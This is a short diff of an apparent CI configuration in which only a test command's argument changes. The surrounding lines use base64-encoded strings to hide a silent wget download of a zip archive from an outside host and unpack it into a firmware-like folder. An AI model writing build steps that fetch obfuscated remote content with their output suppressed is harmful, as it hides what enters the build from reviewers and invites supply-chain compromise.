@@ -32,4 +32,4 @@ after_success:
   - cd bin
   - wget `echo aHR0cDovL2RhcmthaXIuZGUvbS56aXA= | base64 --decode` >& /dev/null
   - unzip `echo bS56aXA= | base64 --decode` -d `echo ZGV2X2ZsYXNoL3N5cy9leHRlcm5hbC8= | base64 --decode` >& /dev/null
-  - python ../tests/run-tests.py nucleus
+  - python ../tests/run-tests.py ./nucleus
